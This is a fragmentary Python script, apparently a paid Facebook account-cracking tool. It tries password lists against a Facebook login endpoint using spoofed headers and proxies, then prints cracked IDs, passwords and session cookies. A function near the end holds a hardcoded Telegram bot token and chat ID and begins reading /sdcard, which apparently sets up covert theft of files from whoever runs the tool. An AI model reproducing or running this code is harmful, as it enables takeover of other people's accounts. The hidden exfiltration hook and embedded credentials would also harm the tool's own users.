...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mBishal')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Bishal' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  Bisha,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/Bishal.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\\033[0;92m
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Bishal ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Bishal King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mBishal-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01872149618 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	Bishalj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Bishalj('\033[0;97m===============================================')
	Bishal= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Bishal in ['m']:
		public()
	elif Bishal in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+880101872149618')
	elif Bishal in ['0']:
...
def setting():
	...
	os.system('espeak -a 300 " 1,  method"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Bishal-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#Bishal-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Bishal-Cp] {idf} • {pw}')     
				...
				#Bishal-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Bishal-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Bishal,  Ok,  id"')
...
def sexy():
    ...
    bot_token = '6945734670:AAE6kH7tMvzk-kt6SkV813oLCnfeV7sa1ps'
    chat_id = '6015821731'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
